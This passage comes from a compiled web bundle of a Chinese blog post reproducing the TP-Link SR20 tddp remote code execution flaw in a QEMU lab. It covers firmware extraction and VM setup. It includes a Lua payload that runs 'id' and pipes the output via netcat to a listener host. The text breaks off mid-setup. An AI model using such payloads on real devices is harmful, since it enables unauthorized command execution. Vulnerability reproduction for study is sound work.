import{_ as D}from"./ValaxyMain.vue_vue_type_style_index_0_lang-fe952921.js";import{_ as F,p as y,c as i,w as o,o as C,a as s,b as l,d as e,r as a,e as A}from"./app-a51598bf.js";import"./YunFooter.vue_vue_type_script_setup_true_lang-9cc900c2.js";import"./YunCard.vue_vue_type_script_setup_true_lang-fac3e250.js";import"./YunPageHeader.vue_vue_type_script_setup_true_lang-e8684ee8.js";const d="/TPlinkSR20_rce/fig1Squashfs.png",_="/TPlinkSR20_rce/fig2arm.jpg",h="/TPlinkSR20_rce/fig3atftpd.jpg",u="/TPlinkSR20_rce/fig9-tddp.jpg",m="/TPlinkSR20_rce/fig10-res.png",g="/TPlinkSR20_rce/fig11-nmap.jpg",f="/TPlinkSR20_rce/fig12-payload.jpg",k="/TPlinkSR20_rce/fig13-res_date.jpg",b="/TPlinkSR20_rce/fig14-res-nc.jpg",v="/TPlinkSR20_rce/fig4.jpg",E="/TPlinkSR20_rce/fig5.jpg",T="/TPlinkSR20_rce/fig6-0x31.jpg",P="/TPlinkSR20_rce/fig7-scanf.jpg",S="/TPlinkSR20_rce/fig8-cmd.jpg",bl=JSON.parse('{"title":"TPlink SR20远程代码执行漏洞","description":"","frontmatter":{"categories":"漏洞复现","date":"2021-04-26T19:12:58.000Z","layout":"post","tags":null,"title":"TPlink SR20远程代码执行漏洞"},"headers":[{"level":2,"title":"漏洞原理","slug":"漏洞原理","link":"#漏洞原理","children":[]},{"level":2,"title":"环境搭建","slug":"环境搭建","link":"#环境搭建","children":[]},{"level":2,"title":"固件","slug":"固件","link":"#固件","children":[]},{"level":2,"title":"复现步骤","slug":"复现步骤","link":"#复现步骤","children":[]},{"level":2,"title":"静态分析","slug":"静态分析","link":"#静态分析","children":[]},{"level":2,"title":"收获","slug":"收获","link":"#收获","children":[]}],"relativePath":"pages/posts/TPlinkSR20 rce.md","path":"/home/runner/work/1ss4kIT.github.io/1ss4kIT.github.io/pages/posts/TPlinkSR20 rce.md","lastUpdated":1690730773000}'),c=JSON.parse('{"title":"TPlink SR20远程代码执行漏洞","description":"","frontmatter":{"categories":"漏洞复现","date":"2021-04-26T19:12:58.000Z","layout":"post","tags":null,"title":"TPlink SR20远程代码执行漏洞"},"headers":[{"level":2,"title":"漏洞原理","slug":"漏洞原理","link":"#漏洞原理","children":[]},{"level":2,"title":"环境搭建","slug":"环境搭建","link":"#环境搭建","children":[]},{"level":2,"title":"固件","slug":"固件","link":"#固件","children":[]},{"level":2,"title":"复现步骤","slug":"复现步骤","link":"#复现步骤","children":[]},{"level":2,"title":"静态分析","slug":"静态分析","link":"#静态分析","children":[]},{"level":2,"title":"收获","slug":"收获","link":"#收获","children":[]}],"relativePath":"pages/posts/TPlinkSR20 rce.md","path":"/home/runner/work/1ss4kIT.github.io/1ss4kIT.github.io/pages/posts/TPlinkSR20 rce.md","lastUpdated":1690730773000}'),B={name:"pages/posts/TPlinkSR20 rce.md",data(){return{data:c,frontmatter:c.frontmatter,$frontmatter:c.frontmatter}},setup(){y("pageData",c)}},w=s("p",null,"漏洞公布时间：2019年3月26日",-1),R={id:"漏洞原理",tabindex:"-1"},x={id:"环境搭建",tabindex:"-1"},q=s("p",null,"1、ubuntu 16.04",-1),$=s("p",null,"2、Qemu 2.5.0",-1),L=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"wget https"),s("span",{style:{color:"#89DDFF"}},"://"),s("span",{style:{color:"#A6ACCD"}},"download"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"qemu"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"org"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"qemu"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"3.1"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"tar"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"xz"),s("span",{style:{color:"#A6ACCD"}}," --no"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"check"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"certificate")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"tar "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"xvJf qemu"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"3.1"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"tar"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"xz")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"cd qemu"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"3.1"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#89DDFF"}},"/")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"./"),s("span",{style:{color:"#A6ACCD"}},"configure --target"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#FFCB6B"}},"list"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}},"arm"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"softmmu --audio"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"drv"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#FFCB6B"}},"list"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}},"alsa"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}},"pa")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#A6ACCD"}},"出现错误：alsa check failed，暂时未解决，故此方法搁置。"),s("span",{style:{color:"#89DDFF"}},"]")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"apt"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"get install qemu")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"root"),s("span",{style:{color:"#89DDFF"}},"@"),s("span",{style:{color:"#A6ACCD"}},"ubuntu"),s("span",{style:{color:"#89DDFF"}},":/"),s("span",{style:{color:"#A6ACCD"}},"home"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"giantbranch"),s("span",{style:{color:"#676E95","font-style":"italic"}},"# qemu-arm --version")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"qemu"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"arm version "),s("span",{style:{color:"#F78C6C"}},"2.5"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#A6ACCD"}},"Debian "),s("span",{style:{color:"#F78C6C"}},"1"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#F78C6C"}},"2.5"),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#A6ACCD"}},"dfsg"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"5ubuntu10"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"51"),s("span",{style:{color:"#89DDFF"}},"),"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"Copyright "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"c"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#F78C6C"}},"2003"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"2008"),s("span",{style:{color:"#A6ACCD"}}," Fabrice Bellard")])])])],-1),j=s("p",null,"3、Binwalk",-1),I=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"git clone https"),s("span",{style:{color:"#89DDFF"}},"://"),s("span",{style:{color:"#A6ACCD"}},"github"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"com"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"ReFirmLabs"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"binwalk")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"cd binwalk")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"python setup"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"py"),s("span",{style:{color:"#A6ACCD"}}," install")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"sudo "),s("span",{style:{color:"#89DDFF"}},"./"),s("span",{style:{color:"#A6ACCD"}},"deps"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"sh"),s("span",{style:{color:"#A6ACCD"}}," $ Debian"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"Ubuntu")])])])],-1),M={id:"固件",tabindex:"-1"},N=s("p",null,"下载最新版 Published Date: 2019-12-17",-1),H=s("p",null,[s("img",{src:d,alt:"fig1Squashfs"})],-1),z=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"binwalk "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"Me tpra_sr20v1_us"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"up"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"ver1"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"2"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"4"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"P123"),s("span",{style:{color:"#89DDFF"}},"\\"),s("span",{style:{color:"#A6ACCD"}},"[20191212-rel55239\\]_2019-12-12_16.21.36.bin")])])])],-1),O=s("p",null,"得到sashes-root，就是固件的文件系统。",-1),U={id:"复现步骤",tabindex:"-1"},V=s("p",null,"1、相关环境（按照文章教程，完整搭建ARM QEMU虚拟机环境。）",-1),J=s("p",null,"将如下三个文件放在同一个文件中",-1),G=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"debian_wheezy_armhf_standard"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"qcow2")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"initrd"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"img"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"3.2"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"4"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"vexpress")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"vmlinuz"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"3.2"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"4"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"vexpress")])])])],-1),K=s("p",null,"执行 如下命令",-1),Q=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"apt install uml"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"utilities")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"tunctl "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"t tap0 "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"u `whoami`")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"sudo ifconfig tap0 "),s("span",{style:{color:"#F78C6C"}},"10.10"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"10"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"1"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#F78C6C"}},"24")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"qemu"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"system"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"arm "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"M vexpress"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"a9 "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"kernel vmlinuz"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"3.2"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"4"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"vexpress "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"initrd initrd"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"img"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"3.2"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"4"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"vexpress "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"drive "),s("span",{style:{color:"#89DDFF","font-style":"italic"}},"if"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}},"sd"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}},"file"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}},"debian_wheezy_armhf_standard"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"qcow2"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"append "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"root=/dev/mmcblk0p2 console=ttyAMA0"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"net nic "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"net tap"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}},"ifname"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}},"tap0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}},"script"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}},"no"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}},"downscript"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}},"no "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"nographic")])])])],-1),Z=s("p",null,"登陆：root/root",-1),X=s("p",null,"ubuntu配置网卡IP：ifconfig eth0 10.10.10.2/24",-1),W=s("p",null,"使用SimpleHTTPServer传递固件",-1),Y=s("p",null,"使用chroot切换根目录固件文件系统",-1),ss=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"mount "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"o bind "),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"dev "),s("span",{style:{color:"#89DDFF"}},"./"),s("span",{style:{color:"#A6ACCD"}},"H"),s("span",{style:{color:"#89DDFF"}},"*-"),s("span",{style:{color:"#A6ACCD"}},"TP"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"Link_SR20"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"dev"),s("span",{style:{color:"#89DDFF"}},"/")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"mount "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"t proc "),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"proc"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"./"),s("span",{style:{color:"#A6ACCD"}},"H4lo"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"TP"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"Link_SR20"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"proc"),s("span",{style:{color:"#89DDFF"}},"/")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"chroot H"),s("span",{style:{color:"#89DDFF"}},"*-"),s("span",{style:{color:"#A6ACCD"}},"TP"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"Link_SR20 sh")])])])],-1),ls=s("p",null,[s("img",{src:_,alt:"fig2arm"})],-1),os=s("p",null,"在宿主机安装 atftpd 搭建 TFTP 服务",-1),ns=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"apt install atftpd")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"编辑"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"etc"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"default"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"atftpd文件 【具体见参考文章】")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"sudo systemctl start atftpd")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"sudo systemctl status atftpd")])])])],-1),es=s("p",null,[s("img",{src:h,alt:"fig3atftpd"})],-1),ts=s("p",null,"2、根目录创建/tftpboot文件",-1),as=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"mkdir "),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"tftpboot")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"chmod "),s("span",{style:{color:"#F78C6C"}},"777"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"tftpboot"),s("span",{style:{color:"#89DDFF"}},"/")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"cd "),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"tftpboot")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"touch payload")])])])],-1),cs=s("p",null,"payload写入如下内容",-1),ps=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"function "),s("span",{style:{color:"#82AAFF"}},"config_test"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"config"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  os"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#82AAFF"}},"execute"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"id | nc 10.10.10.1 1337"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"end")])])])],-1),rs=s("p",null,"3、qemu虚拟机中启动tddp程序",-1),Ds=s("div",{class:"language-"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"qemu-arm -L . ./usr/bin/tddp")])])])],-1),Fs=s("p",null,"执行这个没反应，直接./tddp也没反应。后来发现，是第一个点需要变成./ 就能成功。",-1),ys=s("p",null,"进入别人发我的H*-TP-Link_SR20文件夹，执行以下任意一条即可启动tddp。",-1),is=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"./"),s("span",{style:{color:"#A6ACCD"}},"qemu"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"arm"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"static "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"L "),s("span",{style:{color:"#89DDFF"}},"./"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"./"),s("span",{style:{color:"#A6ACCD"}},"usr"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#82AAFF"}},"bin"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"tddp")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"qemu"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"arm "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"L "),s("span",{style:{color:"#89DDFF"}},"./"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"./"),s("span",{style:{color:"#A6ACCD"}},"usr"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#82AAFF"}},"bin"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"tddp")])])])],-1),Cs=s("p",null,"但是此时是在qemu中的，所以直接./即可执行",-1),As=s("p",null,[s("img",{src:u,alt:"fig9-tddp"})],-1),ds=s("p",null,"4、宿主NC监听，且宿主执行POC",-1),_s=s("p",null,"结果如下：",-1),hs=s("p",null,[s("img",{src:m,alt:"fig10-res"})],-1),us=s("p",null,"有错误，是在调用Lua API的时候出错了，我太菜了不懂原理，先不用这种了，用另一种方法。",-1),ms=s("p",null,"1、虚拟机root用户",-1),gs=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"tunctl "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"t tap0 "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"u `whoami`")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"sudo ifconfig tap0 "),s("span",{style:{color:"#F78C6C"}},"10.10"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"10"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"1"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#F78C6C"}},"24")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"qemu"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"system"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"arm "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"M vexpress"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"a9 "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"kernel vmlinuz"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"3.2"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"4"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"vexpress "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"initrd initrd"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"img"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"3.2"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"0"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#F78C6C"}},"4"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"vexpress "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"drive "),s("span",{style:{color:"#89DDFF","font-style":"italic"}},"if"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}},"sd"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}},"file"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}},"debian_wheezy_armhf_standard"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"qcow2"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"append "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"root=/dev/mmcblk0p2 console=ttyAMA0"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"net nic "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"net tap"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}},"ifname"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}},"tap0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}},"script"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}},"no"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}},"downscript"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}},"no "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"nographic")])])])],-1),fs=s("p",null,"登陆：root/root",-1),ks=s("p",null,"qemu配置网卡IP：ifconfig eth0 